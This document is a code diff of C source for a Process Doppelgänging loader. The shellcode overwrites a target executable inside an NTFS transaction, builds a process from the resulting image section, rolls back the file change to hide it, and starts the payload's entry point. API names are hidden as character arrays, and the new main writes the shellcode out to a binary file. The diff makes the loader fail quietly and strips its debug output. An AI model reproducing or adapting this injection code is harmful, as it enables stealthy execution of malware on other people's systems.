@@ -23,7 +23,6 @@ int my_wstrlen(PWCHAR str);
 int my_strlen(char *str);
 HMODULE find_kernel32(void);
 FARPROC find_function(HMODULE module, char *name);
-void fatal_error();
 LPVOID file_to_buffer(LPWSTR payload, LPDWORD payloadSize);
 ULONGLONG get_entry_point(BYTE *lpPayloadBuffer, MY_PPEB remotePeb);
 
@@ -85,31 +84,32 @@ int __stdcall shellcode(void)
 	char StrNtQueryInformationProcess[] = { 'N','t','Q','u','e','r','y','I','n','f','o','r','m','a','t','i','o','n','P','r','o','c','e','s','s','\0' };
 	char StrNtReadVirtualMemory[] = { 'N','t','R','e','a','d','V','i','r','t','u','a','l','M','e','m','o','r','y','\0' };
 	char StrNtCreateThreadEx[] = { 'N','t','C','r','e','a','t','e','T','h','r','e','a','d','E','x','\0' };
+	char StrGetLastError[] = { 'G','e','t','L','a','s','t','E','r','r','o','r','\0' };
 	
 	// Pointers to functions retrieved dynamically
 	FARPROC _getModuleHandleA = NULL, _createTransaction = NULL, _createFileTransactedW = NULL, _writeFile = NULL;
-	FARPROC _rollbackTransaction = NULL, _virtualAllocEx = NULL, _loadLibraryA = NULL;
+	FARPROC _rollbackTransaction = NULL, _virtualAllocEx = NULL, _loadLibraryA = NULL, _getLastError = NULL;
 
 	// Load needed DLLs
 	hKernel32 = find_kernel32();
 	_getModuleHandleA = find_function(hKernel32, StrGetModuleHandleA);
 	_loadLibraryA = find_function(hKernel32, StrLoadLibraryA);
+	_getLastError = find_function(hKernel32, StrGetLastError);
 	hNtdll = _getModuleHandleA(StrNtdll);
 	hKtmW32= _loadLibraryA("ktmw32.dll");
 
 	// Create a transaction.
 	_createTransaction = find_function(hKtmW32, StrCreateTransaction);
 	if (!_createTransaction)
-		fatal_error();
+		goto error;
 	hTransaction = _createTransaction(NULL, NULL, 0, 0, 0, 0, NULL);
-	status = GetLastError();
 	if (INVALID_HANDLE_VALUE == hTransaction)
-		fatal_error();
+		goto error;
 
 	// Open a transacted file (the target clean process).
 	_createFileTransactedW = find_function(hKernel32, StrCreateFileTransactedW);
 	if (!_createFileTransactedW)
-		fatal_error();
+		goto error;
 	hTransactedFile = _createFileTransactedW(
 		targetProcess, 
 		GENERIC_READ | GENERIC_WRITE, 
@@ -123,21 +123,23 @@ int __stdcall shellcode(void)
 		NULL
 	);
 	if (INVALID_HANDLE_VALUE == hTransactedFile)
-		fatal_error();
+		goto error;
 
 	// Overwrite the opened file with malicious code.
 	lpPayloadBuffer = file_to_buffer(payload, &payloadSize);
-	printf("Size of the payload buffer : %d\n", payloadSize);
-	printf("Buffer : \n%s\n", lpPayloadBuffer);
+	if (!lpPayloadBuffer)
+		goto error;
+	//printf("Size of the payload buffer : %d\n", payloadSize);
+	//printf("Buffer : \n%s\n", lpPayloadBuffer);
 
 	_writeFile = find_function(hKernel32, StrWriteFile);
 	if (!_writeFile)
-		fatal_error();
+		goto error;
 	_writeFile(hTransactedFile, lpPayloadBuffer, payloadSize, &bytesWritten, NULL);
 
 	// Create the section in the target process.
 	_ntCreateSection = (NT_CREATE_SECTION)find_function(hNtdll, StrNtCreateSection);
-	printf("Address of NtCreateSection(): %p\n", _ntCreateSection);
+	//printf("Address of NtCreateSection(): %p\n", _ntCreateSection);
 	status = -1;
 	if (_ntCreateSection)
 	{
@@ -152,18 +154,18 @@ int __stdcall shellcode(void)
 		);
 	}
 	if (STATUS_SUCCESS != status)
-		fatal_error();
+		goto error;
 
 	// Rollback the transaction to remove our changes from the file system.
 	_rollbackTransaction = find_function(hKtmW32, StrRollbackTransaction);
 	if (!_rollbackTransaction)
-		fatal_error();
+		goto error;
 	if (!_rollbackTransaction(hTransaction))
-		fatal_error();
+		goto error;
 
 	// Create a new process to wrap the previously created section.
 	_ntCreateProcessEx = (NT_CREATE_PROCESS_EX)find_function(hNtdll, StrNtCreateProcessEx);
-	printf("Address of NtCreateProcessEx(): %p\n", _ntCreateProcessEx);
+	//printf("Address of NtCreateProcessEx(): %p\n", _ntCreateProcessEx);
 	status = -1;
 	if (_ntCreateProcessEx)
 	{
@@ -180,13 +182,15 @@ int __stdcall shellcode(void)
 		);
 	}
 	if (STATUS_SUCCESS != status)
-		fatal_error();
+		goto error;
 
 	// Create the parameters for that process.
 	_rtlCreateProcessParametersEx = (RTL_CREATE_PROCESS_PARAMETERS_EX)find_function(hNtdll, StrRtlCreateProcessParametersEx);
 	_rtlInitUnicodeString = (RTL_INIT_UNICODE_STRING)find_function(hNtdll, StrRtlInitUnicodeString);
-	printf("Address of RtlCreateProcessParameters(): %p\n", _rtlCreateProcessParametersEx);
-	printf("Address of RtlInitUnicodeString(): %p\n", _rtlInitUnicodeString);
+	if (!_rtlInitUnicodeString)
+		goto error;
+	//printf("Address of RtlCreateProcessParameters(): %p\n", _rtlCreateProcessParametersEx);
+	//printf("Address of RtlInitUnicodeString(): %p\n", _rtlInitUnicodeString);
 
 	_rtlInitUnicodeString(&uPath, targetProcess);
 	_rtlInitUnicodeString(&uDirectory, directory);
@@ -210,13 +214,13 @@ int __stdcall shellcode(void)
 		);
 	}
 	if (STATUS_SUCCESS != status)
-		fatal_error();
+		goto error;
 
 	// Allocate enough memory in the remote process' address space to write the 
 	// process parameters pointer into it.
 	_virtualAllocEx = find_function(hKernel32, StrVirtualAllocEx);
 	if (!_virtualAllocEx)
-		fatal_error();
+		goto error;
 	remoteProcParams = _virtualAllocEx(
 		hProcess,
 		processParameters,
@@ -225,11 +229,11 @@ int __stdcall shellcode(void)
 		PAGE_READWRITE
 	);
 	if (!remoteProcParams)
-		fatal_error();
+		goto error;
 
 	// Write the parameters to the remote process.
 	_ntWriteVirtualMemory = (NT_WRITE_VIRTUAL_MEMORY)find_function(hNtdll, StrNtWriteVirtualMemory);
-	printf("Address of NtWriteVirtualMemory() : %p\n", _ntWriteVirtualMemory);
+	//printf("Address of NtWriteVirtualMemory() : %p\n", _ntWriteVirtualMemory);
 	status = _ntWriteVirtualMemory(
 		hProcess,
 		processParameters,
@@ -238,7 +242,7 @@ int __stdcall shellcode(void)
 		NULL
 	);
 	if (STATUS_SUCCESS != status)
-		fatal_error();
+		goto error;
 	
 	// Get remote process' PEB address.
 	_ntQueryInformationProcess = (NT_QUERY_INFORMATION_PROCESS)find_function(hNtdll, StrNtQueryInformationProcess);
@@ -254,11 +258,11 @@ int __stdcall shellcode(void)
 		);
 	}
 	if (STATUS_SUCCESS != status)
-		fatal_error();
+		goto error;
 
 	// Read the memory of the target process to be able to fetch its image base address.
 	_ntReadVirtualMemory = (NT_READ_VIRTUAL_MEMORY)find_function(hNtdll, StrNtReadVirtualMemory);
-	printf("Address of NtReadVirtualMemory() : %p\n", _ntReadVirtualMemory);
+	//printf("Address of NtReadVirtualMemory() : %p\n", _ntReadVirtualMemory);
 	status = -1;
 	if (_ntReadVirtualMemory)
 	{
@@ -271,12 +275,12 @@ int __stdcall shellcode(void)
 		);
 	}
 	if (STATUS_SUCCESS != status)
-		fatal_error();
-	printf("remotePeb.ImageBaseAddress : %p\n", remotePeb.ImageBaseAddress);
+		goto error;
+	//printf("remotePeb.ImageBaseAddress : %p\n", remotePeb.ImageBaseAddress);
 
 	// Overwrite remote process' ProcessParameters pointer to point to the one we 
 	// created.
-	printf("remotePeb.ProcessParameters (before) : %p\n", remotePeb.ProcessParameters);
+	//printf("remotePeb.ProcessParameters (before) : %p\n", remotePeb.ProcessParameters);
 	offset = (ULONGLONG)&remotePeb.ProcessParameters - (ULONGLONG)&remotePeb;
 	remoteImageBase = (LPVOID) ( (ULONGLONG)pbi.PebBaseAddress + offset);
 	status = _ntWriteVirtualMemory (
@@ -287,14 +291,16 @@ int __stdcall shellcode(void)
 		NULL
 	);
 	if (STATUS_SUCCESS != status)
-		fatal_error();
+		goto error;
 
 	// Get remote process' entry point to let the main thread knows where to start.
 	remoteEntryPoint = (LPTHREAD_START_ROUTINE)get_entry_point(lpPayloadBuffer, &remotePeb);
+	if (!remoteEntryPoint)
+		goto error;
 
 	// Create the main thread for the new process.
 	_ntCreateThreadEx = (NT_CREATE_THREAD_EX)find_function(hNtdll, StrNtCreateThreadEx);
-	printf("Address of NtCreateThreadEx(): %p\n", _ntCreateThreadEx);
+	//printf("Address of NtCreateThreadEx(): %p\n", _ntCreateThreadEx);
 	status = 0;
 	if (_ntCreateThreadEx)
 	{
@@ -313,25 +319,15 @@ int __stdcall shellcode(void)
 		);
 	}
 	if (STATUS_SUCCESS != status)
-		fatal_error();
+		goto error;
+	
 	getchar();
 
 	return 0;
-}
 
-void fatal_error()
-{
-	HMODULE hKernel32 = NULL;
-	FARPROC _getLastError = NULL, _exitProcess = NULL;
-	char StrGetLastError[] = { 'G','e','t','L','a','s','t','E','r','r','o','r','\0' };
-	char StrExitProcess[] = { 'E','x','i','t','P','r','o','c','e','s','s','\0' };
-
-	hKernel32 = find_kernel32();
-	_getLastError = find_function(hKernel32, StrGetLastError);
-	_exitProcess = find_function(hKernel32, StrExitProcess);
-
-	//printf("[-] Error : %s\n", msg);
-	_exitProcess(EXIT_FAILURE);
+error:
+	_getLastError();
+	return -1;
 }
 
 /*
@@ -374,23 +370,23 @@ LPVOID file_to_buffer(LPWSTR payload, LPDWORD payloadSize)
 		NULL
 	);
 	if (INVALID_HANDLE_VALUE == hPayloadFile)
-		fatal_error();
+		return NULL;
 
 	if (!_getFileSizeEx(hPayloadFile, payloadSize))
-		fatal_error();
+		return NULL;
 
 	// Allocate memory for the file.
 	if ( !(hHeap = _getProcessHeap()) )
-		fatal_error();
+		return NULL;
 
 	//lpPayloadBuffer = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, *payloadSize);
 	lpPayloadBuffer = _virtualAlloc(NULL, *payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 	if (!lpPayloadBuffer)
-		fatal_error();
+		return NULL;
 
 	// Put file content into memory.
-	if ( !_readFile(hPayloadFile, lpPayloadBuffer, *payloadSize, &bytesRead, NULL) )
-		fatal_error();
+	if (!_readFile(hPayloadFile, lpPayloadBuffer, *payloadSize, &bytesRead, NULL))
+		return NULL;
 
 	_closeHandle(hPayloadFile);
 
@@ -410,11 +406,11 @@ ULONGLONG get_entry_point(BYTE *lpPayloadBuffer, MY_PPEB remotePeb)
 	// Source : PE file format compendium 1.1 (by Goppit).
 	dosHeader = (IMAGE_DOS_HEADER*)lpPayloadBuffer;
 	if (IMAGE_DOS_SIGNATURE != dosHeader->e_magic)
-		fatal_error();
+		return 0;
 	
 	peHeader = (IMAGE_NT_HEADERS64*)(lpPayloadBuffer + dosHeader->e_lfanew);
 	if (IMAGE_NT_SIGNATURE != peHeader->Signature)
-		fatal_error();
+		return 0;
 
 	// The entry point address is the addition of the base address of the process 
 	// (got from the PEB structure filled with NtQueryInformationProcess, the one 
@@ -423,8 +419,8 @@ ULONGLONG get_entry_point(BYTE *lpPayloadBuffer, MY_PPEB remotePeb)
 	// (from the image base) present in the OptionalHeader.
 	imageBase = (ULONGLONG)remotePeb->ImageBaseAddress;
 	offset = peHeader->OptionalHeader.AddressOfEntryPoint;
-	printf("imageBase : %p\n", imageBase);
-	printf("offset : %d\n", offset);
+	//printf("imageBase : %p\n", imageBase);
+	//printf("offset : %d\n", offset);
 
 	entryPoint = imageBase + offset;
 
@@ -499,7 +495,7 @@ HMODULE find_kernel32(void)
 	do {
 		if ( !my_strcmp(module_ptr->FullDllName.Buffer, str, my_wstrlen(str) << 1) )
 		{
-			//wprintf(L"[+] kernel32.dll found at: 0x%p\n", module_ptr->Reserved2[0]);
+			//w//printf(L"[+] kernel32.dll found at: 0x%p\n", module_ptr->Reserved2[0]);
 			return (HMODULE)module_ptr->Reserved2[0];
 		}
 
@@ -534,7 +530,7 @@ FARPROC find_function(HMODULE module, char *name)
 		{
 			WORD nameord = nameords[i];
 			int funcrva = funcs[nameord];
-			//printf("[+] function %s found at: 0x%p\n", str, (char*)module + funcrva);
+			////printf("[+] function %s found at: 0x%p\n", str, (char*)module + funcrva);
 			return (FARPROC)((char*)module + funcrva);
 		}
 	}
@@ -546,20 +542,15 @@ void __declspec() END_SHELLCODE(void) {}
 
 int main(void)
 {
-	shellcode();
-	/*
-	HMODULE kernel32 = NULL;
-	FARPROC loadlibrary = NULL;
-	char func_name[] = { 'L','o','a','d','L','i','b','r','a','r','y','A','\0' };
-	char user32[] = {'u','s','e','r','3','2','.','d','l','l','\0'};
-	int status = 0;
+	FILE *output = NULL;
 
-	kernel32 = find_kernel32();
-	loadlibrary = find_function(kernel32, func_name);
+	puts("[+] Starting..");
+	output = fopen("doppelganging.bin", "wb");
+	fwrite(shellcode, (int)END_SHELLCODE - (int)shellcode, 1, output);
+	fclose(output);
+	puts("[+] Done!");
 
-	status = loadlibrary(user32);
-	//printf("[+] library lodaded at: 0x%p\n", status);
-	
-	return status;
-	*/
+	getchar();
+
+	return 0;
 }
